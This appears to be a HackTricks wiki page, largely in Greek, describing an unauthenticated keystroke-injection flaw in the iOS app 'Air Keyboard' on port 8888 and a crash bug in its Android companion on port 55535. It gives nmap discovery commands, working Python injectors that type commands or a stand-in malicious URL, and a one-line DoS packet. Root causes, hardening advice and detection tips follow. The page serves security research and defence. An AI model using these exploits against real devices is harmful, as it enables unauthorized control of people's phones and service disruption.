# Air Keyboard Remote Input Injection (Unauthenticated TCP / WebSocket Listener)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

Η έκδοση iOS της εμπορικής εφαρμογής **“Air Keyboard”** (App Store ID 6463187929) εκθέτει μια υπηρεσία τοπικού δικτύου που **αποδέχεται καρέ πλήκτρων χωρίς καμία πιστοποίηση ή επαλήθευση προέλευσης**. Ανάλογα με την εγκατεστημένη έκδοση, η υπηρεσία είναι είτε:

* **≤ 1.0.4**  – raw TCP listener σε **port 8888** που αναμένει μια κεφαλίδα μήκους 2 byte ακολουθούμενη από ένα *device-id* και το ASCII payload.
* **≥ 1.0.5 (Ιούνιος 2025)**  – **WebSocket** listener στην *ίδια* θύρα (**8888**) που αναλύει **JSON** κλειδιά όπως `{"type":1,"text":"…"}`.

Οποιαδήποτε συσκευή στο ίδιο Wi-Fi / υποδίκτυο μπορεί επομένως να **εισάγει αυθαίρετη είσοδο πληκτρολογίου στο τηλέφωνο του θύματος, επιτυγχάνοντας πλήρη απομακρυσμένη αλληλεπίδραση**.
Μια συνοδευτική έκδοση Android ακούει σε **port 55535**. Εκτελεί μια αδύναμη χειραψία AES-ECB, αλλά τα κακοσχεδιασμένα δεδομένα προκαλούν ακόμα μια **μη διαχειριζόμενη εξαίρεση μέσα στο OpenSSL**, καταρρίπτοντας την υπηρεσία στο παρασκήνιο (**DoS**).

> Η ευπάθεια είναι **ακόμα μη επιδιορθωμένη την ώρα της συγγραφής (Ιούλιος 2025)** και η εφαρμογή παραμένει διαθέσιμη στο App Store.

---

## 1. Service Discovery

Σαρώστε το τοπικό δίκτυο και αναζητήστε τις δύο σταθερές θύρες που χρησιμοποιούνται από τις εφαρμογές:
```bash
# iOS (unauthenticated input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
Στις συσκευές Android μπορείτε να εντοπίσετε το υπεύθυνο πακέτο τοπικά:
```bash
adb shell netstat -tulpn | grep 55535      # no root required on emulator
# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                 # map PID → package name
```
Σε **jailbroken iOS** μπορείτε να κάνετε κάτι παρόμοιο με `lsof -i -nP | grep LISTEN | grep 8888`.

---

## 2. Λεπτομέρειες Πρωτοκόλλου (iOS)

### 2.1  Κληρονομιά (≤ 1.0.4) – προσαρμοσμένα δυαδικά πλαίσια
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
Η δηλωμένη *μήκος* περιλαμβάνει το byte `device_id` **αλλά όχι** την επικεφαλίδα δύο bytes.

### 2.2  Τρέχουσα (≥ 1.0.5) – JSON μέσω WebSocket

Η έκδοση 1.0.5 μετανάστευσε σιωπηλά σε WebSockets διατηρώντας τον αριθμό θύρας αμετάβλητο. Ένα ελάχιστο πλήκτρο πληκτρολόγησης φαίνεται όπως:
```json
{
"type": 1,              // 1 = insert text, 2 = special key
"text": "open -a Calculator\n",
"mode": 0,
"shiftKey": false,
"selectionStart": 0,
"selectionEnd": 0
}
```
Δεν απαιτείται handshake, token ή υπογραφή – το πρώτο JSON αντικείμενο ήδη ενεργοποιεί το UI event.

---

## 3. Εκμετάλλευση PoC

### 3.1 Στοχεύοντας ≤ 1.0.4 (raw TCP)
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard ≤ 1.0.4 (TCP mode)"""
import socket, sys

target_ip  = sys.argv[1]                 # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"    # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                        # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("[+] Injected", keystrokes)
```
### 3.2 Στοχοθέτηση ≥ 1.0.5 (WebSocket)
```python
#!/usr/bin/env python3
"""Inject keystrokes into Air Keyboard ≥ 1.0.5 (WebSocket mode)"""
import json, sys, websocket  # `pip install websocket-client`

target_ip = sys.argv[1]
ws        = websocket.create_connection(f"ws://{target_ip}:8888")
ws.send(json.dumps({
"type": 1,
"text": "https://evil.example\n",
"mode": 0,
"shiftKey": False,
"selectionStart": 0,
"selectionEnd": 0
}))
ws.close()
print("[+] URL opened on target browser")
```
*Οποιοδήποτε εκτυπώσιμο ASCII — συμπεριλαμβανομένων των αλλαγών γραμμής, των ταμπ και των περισσότερων ειδικών πλήκτρων — μπορεί να σταλεί, δίνοντας στον επιτιθέμενο την ίδια δύναμη με την φυσική είσοδο του χρήστη: εκκίνηση εφαρμογών, αποστολή IMs, άνοιγμα κακόβουλων URLs, εναλλαγή ρυθμίσεων, κ.λπ.*

---

## 4. Android Companion – Denial-of-Service

Η Android έκδοση (55535) αναμένει έναν **κωδικό πρόσβασης 4 χαρακτήρων κρυπτογραφημένο με ένα σκληρά κωδικοποιημένο AES-128-ECB κλειδί** ακολουθούμενο από μια τυχαία nonce.  Τα σφάλματα ανάλυσης ανεβαίνουν στο `AES_decrypt()` και δεν ανιχνεύονται, τερματίζοντας το νήμα ακρόασης.  Ένα μόνο κακώς διαμορφωμένο πακέτο αρκεί για να κρατήσει τους νόμιμους χρήστες αποσυνδεδεμένους μέχρι να επανεκκινηθεί η διαδικασία.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
---

## 5. Σχετικές Εφαρμογές – Ένα Επαναλαμβανόμενο Αντι-Πρότυπο

Το Air Keyboard είναι **όχι μια απομονωμένη περίπτωση**. Άλλες κινητές “remote keyboard/mouse” εφαρμογές έχουν αποσταλεί με την ίδια ακριβώς αδυναμία:

* **Telepad ≤ 1.0.7** – CVE-2022-45477/78 επιτρέπουν μη αυθεντικοποιημένη εκτέλεση εντολών και καταγραφή πλήκτρων σε απλό κείμενο.
* **PC Keyboard ≤ 30** – CVE-2022-45479/80 μη αυθεντικοποιημένη RCE & υποκλοπή κυκλοφορίας.
* **Lazy Mouse ≤ 2.0.1** – CVE-2022-45481/82/83 προεπιλεγμένο-χωρίς-κωδικό, αδύναμος κωδικός PIN brute-force και διαρροή σε καθαρό κείμενο.

Αυτές οι περιπτώσεις αναδεικνύουν μια συστημική αμέλεια των **επιφανειών επίθεσης που είναι εκτεθειμένες στο δίκτυο σε κινητές εφαρμογές**.

---

## 6. Ρίζες Προβλημάτων

1. **Καμία έλεγχο προέλευσης / ακεραιότητας** σε εισερχόμενα πλαίσια (iOS).
2. **Κακή χρήση κρυπτογραφίας** (στατικός κωδικός, ECB, έλλειψη επικύρωσης μήκους) και **έλλειψη χειρισμού εξαιρέσεων** (Android).
3. **Δικαιώματα Τοπικού Δικτύου που παραχωρούνται από τον χρήστη ≠ ασφάλεια** – το iOS ζητά συγκατάθεση κατά την εκτέλεση για κυκλοφορία LAN, αλλά αυτό δεν υποκαθιστά την κατάλληλη αυθεντικοποίηση.

---

## 7. Στερέωση & Αμυντικά Μέτρα

Συστάσεις για προγραμματιστές:

* Δέστε τον ακροατή σε **`127.0.0.1`** και σήρατε μέσω **mTLS** ή **Noise XX** αν χρειάζεται απομακρυσμένος έλεγχος.
* Παράγετε **μυστικά ανά συσκευή κατά την εκκίνηση** (π.χ., QR code ή Pairing PIN) και επιβάλετε *αμοιβαία* αυθεντικοποίηση πριν την επεξεργασία εισόδου.
* Υιοθετήστε το **Apple Network Framework** με *NWListener* + TLS αντί για ακατέργαστους υποδοχείς.
* Εφαρμόστε **έλεγχοι εγκυρότητας μήκους** και δομημένο χειρισμό εξαιρέσεων κατά την αποκρυπτογράφηση ή αποκωδικοποίηση πλαισίων.

Γρήγορες νίκες Blue-/Red-Team:

* **Κυνήγι δικτύου:** `sudo nmap -n -p 8888,55535 --open 192.168.0.0/16` ή φίλτρο Wireshark `tcp.port == 8888`.
* **Επιθεώρηση κατά την εκτέλεση:** Σενάριο Frida που συνδέει `socket()`/`NWConnection` για να καταγράψει απροσδόκητους ακροατές.
* **Αναφορά Ιδιωτικότητας Εφαρμογών iOS (Ρυθμίσεις ▸ Ιδιωτικότητα & Ασφάλεια ▸ Αναφορά Ιδιωτικότητας Εφαρμογών)** αναδεικνύει εφαρμογές που επικοινωνούν με διευθύνσεις LAN – χρήσιμο για την ανίχνευση κακόβουλων υπηρεσιών.
* **Mobile EDRs** μπορούν να προσθέσουν απλούς κανόνες Yara-L για τα κλειδιά JSON `"selectionStart"`, `"selectionEnd"` μέσα σε καθαρό κείμενο TCP payloads στην πόρτα 8888.

---

## Detection Cheat-Sheet (Pentesters)
```bash
# Locate vulnerable devices in a /24 and print IP + list of open risky ports
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - \
| awk '/Ports/{print $2 "  " $4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do \
echo -n \"$p → \"; cat /proc/$p/cmdline; done"
```
---

## Αναφορές

- [Exploit-DB 52333 – Air Keyboard iOS App 1.0.5 Remote Input Injection](https://www.exploit-db.com/exploits/52333)
- [Mobile-Hacker Blog (17 Ιουλ 2025) – Remote Input Injection Vulnerability in Air Keyboard iOS App Still Unpatched](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)

{{#include ../../banners/hacktricks-training.md}}
